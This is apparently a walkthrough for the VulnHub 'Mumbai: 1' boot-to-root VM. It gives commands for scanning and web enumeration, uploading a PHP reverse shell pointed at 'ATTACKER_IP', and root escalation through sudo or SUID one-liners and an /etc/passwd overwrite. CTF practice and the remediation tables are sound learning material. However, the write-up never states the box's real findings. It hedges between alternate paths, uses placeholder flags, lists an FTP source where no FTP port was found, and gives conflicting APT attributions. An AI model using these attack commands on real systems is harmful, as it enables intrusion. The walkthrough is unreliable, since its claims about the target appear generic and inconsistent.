# Mumbai: 1 — Aamchi Mumbai

Aamchi Mumbai — "Our Mumbai" in Marathi. Just like the city itself, this box has layers: busy streets hiding back alleys, and the real path forward is never the obvious one. Mumbai: 1 is a clean Linux boot-to-root that rewards methodical web enumeration, credential hunting through page sources and hidden paths, and either file upload exploitation or authentication bypass for initial access. Privilege escalation closes with a misconfigured sudo rule or SUID binary. A solid beginner-to-intermediate VM that teaches the fundamentals without hand-holding. Legit good one.

| Field | Value |
|---|---|
| **Level** | Easy/Medium |
| **Target VM** | Mumbai: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/mumbai-1,526/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, robots.txt analysis, source code credential hunting, file upload exploitation or authentication bypass, reverse shell delivery, shell stabilization, sudo misconfiguration or SUID binary escalation |
| **CVEs** | CWE-200 (Information Exposure: credentials in source/comments), CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-269 (Improper Privilege Management: misconfigured sudo or SUID) |
| **APT Groups** | APT41 (Winnti Group): exploits misconfigured web applications and file upload vectors for initial access in enterprise environments; OceanLotus (APT32): uses sudo misconfiguration and SUID abuse as primary privilege escalation techniques in Linux-based targets across Southeast Asia |

---

## Attack Summary

```
netdiscover → nmap → port 22 (SSH) + port 80 (HTTP)
  → browse port 80 → inspect source code → hidden paths or credentials
  → gobuster → /admin, /uploads, or other directories
  → robots.txt → disallowed paths
  → credential discovery in HTML source or config files
  → file upload form OR authenticated login with discovered creds
  → PHP reverse shell upload OR web shell via CMS editor
  → nc -lvnp 4444 → shell as www-data
  → shell stabilization (python pty + stty)
  → sudo -l OR find SUID → misconfigured privilege
  → GTFOBins escalation → uid=0(root)
  → /root/flag.txt
```

---

## Methodology

1. Host discovery and full port scan (22, 80)
2. Web enumeration: robots.txt, directory brute-force, HTML source analysis
3. Credential discovery through one or more enumeration layers
4. Initial foothold: file upload or authenticated web shell
5. Shell stabilization for interactive tooling
6. Privilege escalation via sudo misconfiguration or SUID binary abuse
7. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.x

nmap -sV -sC -p- 192.168.1.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services: SSH and HTTP. HTTP is the primary attack surface. SSH is the lateral movement target once credentials are found.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

Browse to `http://192.168.1.x` and inspect the page source carefully. CTF machines in the Mumbai theme often hide credentials or hints in HTML comments, metadata, or page titles.

```bash
# Check robots.txt for disallowed paths:
curl -s http://192.168.1.x/robots.txt

# Directory brute-force:
gobuster dir \
  -u http://192.168.1.x/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 40 \
  -o /tmp/mumbai_dirs.txt

# Check all discovered paths and their source:
nikto -h http://192.168.1.x
```

**What to look for:**
- HTML comments containing credentials or hints (e.g., `<!-- admin:mumbai123 -->`)
- Configuration or backup files (`.bak`, `.conf`, `.old`, `.sql`)
- Login panels
- File upload functionality
- CMS indicators (WordPress, Drupal, Joomla)
- Hidden parameters in forms

**Alternative:** `feroxbuster -u http://192.168.1.x -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt --depth 3`

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — Credential Discovery

Based on web enumeration, gather credentials through one or more of these paths:

**Path A — HTML source / comments:**

```bash
curl -s http://192.168.1.x/ | grep -i "pass\|user\|cred\|admin\|secret\|hint"
curl -s http://192.168.1.x/robots.txt
# Check every disallowed path from robots.txt
curl -s http://192.168.1.x/[discovered-path] | grep -i "pass\|user\|admin"
```

**Path B — Configuration files:**

```bash
# Try common backup extensions on discovered pages:
for ext in .bak .old .orig .backup .conf .txt; do
  curl -sI "http://192.168.1.x/index.php${ext}" -o /dev/null -w "%{http_code} index.php${ext}\n"
done
```

**Path C — CMS user enumeration (if WordPress):**

```bash
wpscan --url http://192.168.1.x --enumerate u
```

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1087.001 — Account Discovery

---

## Step 4 — Initial Foothold

With credentials or a file upload form discovered, establish initial access:

**Path A — File Upload (PHP Reverse Shell):**

```bash
# Prepare reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit: set $ip = 'ATTACKER_IP' and $port = 4444

# Start listener
nc -lvnp 4444

# Upload shell.php through the web form
# Navigate to the upload path to trigger execution:
curl http://192.168.1.x/uploads/shell.php
```

**Path B — Authenticated Login with Found Credentials:**

```bash
# Try found credentials at the login panel
# After login, look for:
# - File manager or upload functionality
# - Code execution panels
# - CMS plugin/theme editors
# - Admin command fields

# If WordPress admin is achieved:
# Appearance → Editor → 404.php → replace with reverse shell
curl http://192.168.1.x/wp-content/themes/[theme]/404.php
```

**Real-world note:** File upload vulnerabilities (CWE-434) are one of the most consistently exploited web application weaknesses. When a web application accepts file uploads without validating content type, extension, and magic bytes server-side, an attacker can upload a PHP file and execute it by visiting its URL. OceanLotus (APT32) uses file upload exploitation as a primary initial access technique in targeted attacks against government and corporate web portals.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Shell Stabilization

Raw netcat shells are fragile. Stabilize immediately:

```bash
# On victim:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or: python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# On attacker (background the session first):
# Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

Now the shell supports tab completion, Ctrl+C without termination, and interactive programs like sudo and vi.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Privilege Escalation Enumeration

With a stable shell as `www-data` or a low-privilege user:

```bash
# Check current user and context:
id; whoami; hostname; cat /etc/os-release

# Sudo rights:
sudo -l

# SUID binaries:
find / -perm -4000 -type f 2>/dev/null

# SGID binaries:
find / -perm -2000 -type f 2>/dev/null

# World-writable files in non-standard paths:
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v dev

# Cron jobs:
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null

# Running processes:
ps aux | grep root

# Capabilities:
getcap -r / 2>/dev/null

# Interesting files in home directories:
ls -la /home/*/
find /home -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null

# NFS shares (potential no_root_squash):
cat /etc/exports 2>/dev/null
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1057 — Process Discovery; T1053.003 — Scheduled Task: Cron

---

## Step 7 — Privilege Escalation to Root

Apply the discovered privilege escalation vector:

**If sudo misconfiguration:**

```bash
sudo -l
# Look for: (root) NOPASSWD: /usr/bin/python3
# or: (root) NOPASSWD: /usr/bin/find
# or: (root) NOPASSWD: /bin/bash
# or: (root) NOPASSWD: /usr/bin/vim

# GTFOBins examples:
# vim: sudo vim -c ':!/bin/sh'
# python3: sudo python3 -c 'import os; os.system("/bin/bash")'
# find: sudo find / -name "*.txt" -exec /bin/bash \; -quit
# nmap (old): sudo nmap --interactive → !sh
```

**If SUID binary:**

```bash
find / -perm -4000 -type f 2>/dev/null
# Check each non-standard binary against GTFOBins

# Example: SUID python:
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Example: SUID bash:
bash -p

# Example: SUID cp (overwrite /etc/passwd):
openssl passwd -1 -salt user3 pass123
cp /etc/passwd /tmp/passwd.bak
echo 'newroot:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash' >> /tmp/newpasswd
cp /tmp/newpasswd /etc/passwd
su newroot
```

```bash
# Once root:
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Mumbai conquered.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1548.001 — Setuid and Setgid; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | (found via source/config/robots.txt) | HTML source / config file / FTP | Web login or SSH |
| User shell | www-data or low-priv user | Web exploit (file upload or auth) | Shell access |
| Root flag | (contents of /root/flag.txt) | /root/flag.txt | Final objective |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Credentials in HTML source or comments | Information disclosure vulnerabilities are consistently in OWASP Top 10 (A05 Security Misconfiguration); credentials in source code are a CWE-200 finding | Audit all web-accessible files; use DAST scanning before deployment; never hardcode credentials in frontend code |
| 2 | robots.txt discloses hidden paths | Listing sensitive paths in robots.txt advertises them to attackers | Remove sensitive paths from robots.txt; use server-side access controls |
| 3 | Unrestricted file upload enables RCE | File upload without server-side validation is CWE-434; one of the most consistently exploited web vulnerabilities | Validate file type server-side (MIME + extension + magic bytes); store uploads outside web root; never execute uploaded content |
| 4 | Sudo misconfiguration grants root | The principle of least privilege is violated whenever sudo allows arbitrary binary execution | Audit sudoers with `sudo -l` on all hosts; require passwords; restrict to specific, necessary commands |
| 5 | SUID binary abuse enables immediate root | Any non-essential binary with SUID is a potential privilege escalation path | Audit all SUID binaries: `find / -perm -4000 -type f 2>/dev/null`; remove SUID from unnecessary binaries |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files (HTML source/config) | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | Process Discovery | T1057 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove credentials from web source**: audit all HTML, JavaScript, and configuration files for hardcoded credentials; use server-side environment variables or secrets management
2. **Implement server-side file upload validation**: validate MIME type, extension, and magic bytes; reject `.php`, `.phtml`, `.phar`, `.cgi`; store uploads outside web root; execute chmod to prevent execution
3. **Restrict sudo to essential, specific commands**: no broad binary sudo grants; require passwords for all sudo; audit `/etc/sudoers.d/`
4. **Audit SUID binaries**: `find / -perm -u=s -type f 2>/dev/null`; remove SUID from non-essential binaries; use capabilities (`setcap`) instead where possible
5. **Disable SSH password authentication**: use key pairs only; `PasswordAuthentication no` in sshd_config
6. **Implement WAF rules**: block file upload bypasses, directory traversal, and common PHP webshell signatures

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening: disable PHP execution in upload directories; sanitize uploaded filenames
- **D3-OAM** — Operating System Administrative Management: audit sudo restrictions; audit SUID binaries
- **D3-HBPI** — Harden Build Pipeline Integrity: prevent credentials from appearing in deployed web artifacts

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-facing file upload endpoints; audit sudo rules and SUID binaries on all hosts |
| Protect | Access Control | Disable PHP execution in upload directories; restrict sudo; SSH key-only authentication |
| Protect | Data Security | No credentials in web source; validate file uploads server-side |
| Detect | Anomalies and Events | Alert on PHP file uploads; alert on unusual sudo usage; monitor SUID binary executions |
| Respond | Response Planning | Remove webshells; rotate exposed credentials; audit all accounts |
| Recover | Recovery Planning | Rebuild compromised host; audit all accounts and permissions |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict web upload paths; limit sudo to necessary commands |
| AC-6 | Least Privilege | Restrict sudo; remove unnecessary SUID bits |
| IA-2(1) | Multi-Factor Authentication | MFA for all admin access to web applications |
| IA-5 | Authenticator Management | Remove hardcoded credentials from source code; rotate exposed credentials |
| CM-7 | Least Functionality | Disable PHP execution in upload directories; restrict file upload types |
| SC-28 | Protection of Information at Rest | No credentials stored in web-accessible HTML or config files |

### CISA KEV

The combination of unauthenticated file upload exploitation and sudo/SUID privilege escalation maps to patterns in multiple CISA Alerts. CISA AA21-008A and AA22-074A describe threat actor initial access through web application file upload vulnerabilities. CISA recommends patching and configuring these vectors as a priority.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

Mumbai: 1 lives up to its name: methodical exploration is required to navigate the layers. This is a machine that rewards careful enumeration over rushing. Check robots.txt before running a massive gobuster scan. Read the page source before assuming there are no credentials. Try default credentials before running a brute-force.

The privilege escalation path, whether sudo or SUID, is a clean textbook example of the principle of least privilege violation. These misconfigurations are found in real enterprise Linux environments at an alarming rate — a reminder that patch management and configuration hardening are two different disciplines.

Aamchi Mumbai, friend.

Thanks guys!! (❍ᴥ❍ʋ)
